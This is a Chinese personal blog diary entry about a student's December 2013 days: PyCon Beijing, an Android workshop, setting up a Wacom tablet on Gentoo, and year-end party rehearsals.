<p>十四号，Pycon 2013<br>Beijing，和室友去了中科院自动化所打酱油，去的晚坐得远，大部分讲web，openstackblabla然后我这近视状况就跪了。<br>也不是毫无收获但没碰上感兴趣的。提问时怂了，一迟疑就不再有机会混本书。不过主办方送了个很漂亮的帽子，室友拿到个人生苦短我用python的T-shirt<br>另外，在看博文视点展示书籍时看到一本社工的书，作者竟然是the real<br>hustle(我喜欢死这个节目了！！！)的设计者之一！然后听到旁边的妹子在推广speedycloud，顺手搭了个话很厚颜无耻地拿了个小本(我当时真是以为是纸片！！就是想拿来用微信扫以下！！！)，后来这个小本用来被我学习近世代数了= =。</p>
<p>对了，还有一顿自动化所食堂不错的午餐。</p>
<p>下午提前回来，因为——我的wacom ctl 471到了，我迫不及待地想看看怎么样。</p>
<p>发现gentoo识别不来，打开虚拟机用xp试了试还行，便有了第一个作品。</p>
<p>后来几天折腾啊，把xf86-input-wacom和libwacom都更新到最新，还是不行，最后把内核升级到3.12终于可以用了。</p>
<p>然后就没空画画了T T</p>
<p>十五号，GDG组织的轻松学安卓第二课，在友盟。和gc社长一起去的。环境相当好，意料之外送了个漂亮的数据线还有一堆零食。<br>工程师讲得很用心但快到我们所有三十来人全没跟上，但最后竟然在旁边gc社长和一漂亮的首师妹子的帮助下运行出来了。<br>然后由于pycon怂掉的刺激提问环节完全不知答案胡乱就举手回答也算答得差不多，再加上东西运行出来了，又混了个安卓小人和google<br>map的徽章。。。我这。。。真不是纯粹是为了混小礼品。。。话说最后旁边的妹子终于也运行出来了。。。就是安卓小人发完了。。。</p>
<p>十六号和师兄在老食堂吃饭为这几天都说要开会激动不已竟然忘了拿笔记本，我都以为找不到了竟然在经理办公室登记领回去了，真心谢谢老食堂二楼的工作人员。算是表达感谢发了个贴，竟然论坛十大了。。。<br>不过晚上取消开会了。</p>
<p>之后的日子迷迷糊糊，似乎在排练准备实验室年会节目、项目、学习R和近世代数中浑浑噩噩度过。大概这样，记不清。</p>
<p>19日的助管平淡无奇，除了帮老师让参会老师签到和分发材料就是录入文件。</p>
<p>下午mapleray来学校，闲逛北邮北师竟然花了一个下午，最后还没留下吃个饭。。。</p>
<p>20日，两个节目排练,又是中心年会场务开会，泳版的版聚又失之交臂。</p>
<p>21日，下午和公司的同事和师兄去ktv排练，然后。。。就不只是排练了。。。冬至晚上在金谷园蒙斌哥请客吃饺子(后来发现被安卓手机日历坑了，22号才是冬至)。回来又赶上Foxsay的排练，排练就是各种欢乐。</p>
<p>还有些其它：</p>
<ul>
<li>在室友的指点下，可以弹唱第一首歌了——A调送别</li>
<li>clamav signature文档翻译，我觉得得根据协议发布，而不能算商业机密。</li>
<li>研究谷歌safe browsing api，跪到不行。</li>
<li>emerge world了</li>
<li>依然保持着一周三游的态势。除了这周不行。</li>
<li>才知道手机应该用带话筒的耳机。。。</li>
</ul>
<p>检视硬盘上，忽然发现有这么一个截图，不知道哪里截取的了：</p>
<blockquote>
<p>你会发现一个有趣的现象，你会惊奇地发现看似不相关的主题却有着出奇相似的道理。</p>
</blockquote>
<p>时光飞逝，已然28号。继续补上没写完的</p>
<p>22号，中心年会，早上起的晚，饭没来得及吃，直接十点被班长带着打车去了京民大厦。会场工作人员没想到去的这么早，各种没准备。然后打开灯光，准备音乐，试话筒调音量，又是一轮接一轮的彩排。到中午又累又饿，<br>当以为会陷入无人管饭的悲催境地时意外地被告知还有工作餐，工作餐还真不错，不知是饿了还是什么吃得很high，也不管是谁在哪买的了。年会结束，散场吃饭。正以为陷入无位置可坐的悲凉境地时，碰上了实验室的人，然后，嗯就有位置了。</p>
<p>23号上课、看近世代数、排练。游泳真是越来越困难了，晚上不是开会就是排练。xwyam竟然来帝都了，也没个空一起吃顿饭。</p>
<p>24号，说是开会没开，竟然游泳去了，开心到不行。晚上意外收到研会的苹果和祝福纸条，意外的惊喜。</p>
<p>25号，圣诞节好像没啥气氛。。。大致是旷了一天课去上班的地方打了个酱油。晚上干嘛了，大概先是公司排练然后在做R语言的演示ppt？</p>
<p>26号，助管倒没什么事，倒是各种排练定动作。晚上又是赶上两边排练。</p>
<p>27号，一早赶到公司定动作排练。下午实验室年会，中午十二点半就被导演喊去布置会场，去了牡丹园花园酒店结果中午的场还没结束。又等了会又排练了阵，本来让我管下ppt，最后也没管= =。等到万事俱结束一群人开始喝酒的时候，和师兄悄悄溜掉压马路回学校了。</p>
<p>28号，上午大概是一群同实验室的人都喝跪了。。。一早被揪起来帮忙还衣服。中午去民大那边，下午回来。回来一觉睡到五点。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">181</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">24</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">66</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.d0u9.xyz/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lazymind.me/" target="_blank">mapleray</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/8/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
